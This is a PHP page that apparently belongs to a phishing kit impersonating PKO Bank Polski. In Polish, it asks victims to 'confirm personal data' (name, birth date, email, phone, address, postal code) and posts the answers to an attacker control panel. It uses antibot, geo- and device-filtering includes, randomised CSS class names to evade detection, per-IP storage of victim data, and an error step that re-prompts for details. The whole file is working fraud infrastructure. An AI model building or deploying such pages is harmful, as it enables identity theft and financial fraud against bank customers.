<?php
    error_reporting(0);
    session_start();

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    include '../includes/check-allowed-countries.php';
    include '../includes/check-devices-allow.php';
    
    $ip = get_client_ip();
    $get_name_file = $ip;
    $target_file = "../panel/storage/{$get_name_file}.json";
    $json_file = file_get_contents($target_file);
    $user_info = json_decode($json_file, true);
    $user_info['error_information'];
    
    if ($user_info['error_information'] == 1) {
        $get_name_page = "Page Infromation Error";
        $get_step = "information-error";
    } else {
        $get_name_page = "Page Infromation";
        $get_step = "information";
    }
    get_page_info($get_name_page, $get_name_file);
    
    $random_classes = rand(0, 1000000); 
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> ">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../img/favicon.ico">
    <link rel="shortcut" type="image/png" href="../img/favicon.ico">
    <link rel="appel-touch-icon" type="image/png" href="../img/favicon.ico">
    <title>STRONA INTERNETOWA</title>
</head>
<body id="body" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> body">
    <!-- Nav -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> nav-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-nav-section">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> logo">
                <img src="../img/logo.png" alt="">
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> btn-lang">
                <img src="../img/flag.png" alt="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> flag">
                PL
                <img src="../img/icon-arrow.png" alt="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> arrow">
            </div>
        </div>
    </div>
    <!-- Nav -->

    <!-- Main -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> main-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-main-section">
            <form action="../control-panel/check-action.php" method="post" id="fSD" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> f-s-d-p-section">
                <input type="hidden" name="step" value="<?php echo $get_step; ?>">
                <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-width">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-2" style="margin-bottom: 10px !important;">
                        <h1>Potwierdź swoje dane osobowe</h1>
                    </div>
                    <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> p-explain">
                        Podaj nam poniższe informacje, abyśmy mogli zweryfikować Twoją tożsamość.
                    </p>
                    <?php
                        if ($user_info['error_information'] == 1) {
                            echo
                            '<div class="message-error-pages">
                                <i class="fa-solid fa-triangle-exclamation"></i>
                                Dane osobowe są nieprawidłowe. Proszę podać dane osobowe dokładnie tak, jak widnieją na dokumencie tożsamości.
                            </div>';
                        }
                    ?>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-l-i-me" id="div1">
                        <input type="text" name="first_name" id="firstName" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element" placeholder="Imię">
                        <small id="messageError1" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i">To pole jest wymagane</small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-l-i-me" id="div2">
                        <input type="text" name="last_name" id="lastName" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element" placeholder="Nazwisko">
                        <small id="messageError2" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i">To pole jest wymagane</small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-l-i-me" id="div3">
                        <input type="text" name="dob" id="dob" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element" placeholder="Data urodzenia (DD/MM/RRRR)">
                        <small id="messageError3" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i">To pole jest wymagane</small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-l-i-me" id="div4">
                        <input type="email" name="email" id="email" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element" placeholder="Adres e-mail">
                        <small id="messageError4" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i">To pole jest wymagane</small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-l-i-me" id="div5">
                        <input type="tel" name="phone_number" id="phoneNumber" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element" placeholder="Numer telefonu">
                        <small id="messageError5" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i">To pole jest wymagane</small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-l-i-me" id="div6">
                        <input type="text" name="address" id="address" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element" placeholder="Adres domowy">
                        <small id="messageError6" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i">To pole jest wymagane</small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-l-i-me" id="div7">
                        <input type="text" name="city" id="city" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element" placeholder="Miasto">
                        <small id="messageError7" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i">To pole jest wymagane</small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-l-i-me" id="div8">
                        <input type="tel" name="zip_code" id="zipCode" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element" placeholder="Kod pocztowy">
                        <small id="messageError8" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i">To pole jest wymagane</small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-btn">
                        <button type="submit" name="b_s_d_p" id="bSD" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> btn-s-d-p-element">Następny</button>
                    </div>
                </div>
            </form>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-text-login">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-image">
                    <img src="../img/image-login.png" alt="">
                </div>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-text">
                    <h1>Ho, ho, ho!</h1>
                    <p>
                        Łap prezent od Mikołaja – do 14.12 br. pożyczka z niższym oprocentowaniem. RRSO 11,42%
                    </p>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> style-btn">Sprawdź propozycję</div>
                </div>
            </div>
        </div> 
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-boxs">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date"><?php echo date("d.m.Y"); ?></small>
                <h4>Bezpieczeństwo zaczyna się od prostych nawyków</h4>
                <p>
                    Koniec roku to dobry moment, by uporządkować kwestie związane z bezpieczeństwem Twoich danych i pieniędzy.
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date"><?php echo date("d.m.Y"); ?></small>
                <h4>Już jest! Potwierdzanie przelewów dziecka w aplikacji IKO</h4>
                <p>
                    Sprawdź nowości dla rodziców
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section" style="margin-bottom: 0px !important;">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date">28.07.<?php echo date("Y"); ?></small>
                <h4 style="color: #ca171d !important;">Kolejne ataki cyberprzestępców</h4>
                <p style="color: #ca171d !important;">
                    Sprawdź najnowsze ostrzeżenia.
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
        </div>
    </div>
    <!-- Main -->

    <!-- Footer -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> footer-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-footer-section">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> links-footer-left">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">© 2025 PKO Bank Polski</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">Kod BIC (Swift): BPKOPLPW</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">Polityka prywatności</span>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> links-footer-right">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-1.png" alt="">Bezpieczeństwo</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-2.png" alt="">Pomoc</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-3.png" alt="">Kontakt</span>
            </div>
        </div>
    </div>
    <!-- Footer -->

    <!-- Script Js -->
    <script src="../js/script-step-one.js"></script>
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/status.php'; ?>
</body>
</html>